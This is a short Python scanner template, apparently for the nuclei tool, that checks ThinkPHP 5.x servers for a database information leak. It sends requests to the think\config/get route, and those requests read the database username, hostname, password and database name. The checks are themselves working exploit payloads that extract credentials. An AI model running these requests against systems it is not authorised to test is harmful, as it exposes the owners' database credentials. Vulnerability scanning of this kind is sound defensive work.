from nuclei import BaseHTTP,Template
http = BaseHTTP(method="POST")
http.set_paths(
    paths=[
        "{{BaseURL}}/?s=/Index/think\\config/get&name=database.username",
        "{{BaseURL}}/?s=/Index/think\\config/get&name=database.hostname",
        "{{BaseURL}}/?s=/Index/think\\config/get&name=database.password",
        "{{BaseURL}}/?s=/Index/think\\config/get&name=database.database",
    ]
)
http.set_status_matcher(
    [200]
)
http.dump(
    id="ThinkPHP 5.x 数据库信息泄露",
    fingers=[
        "thinkphp"
    ]
)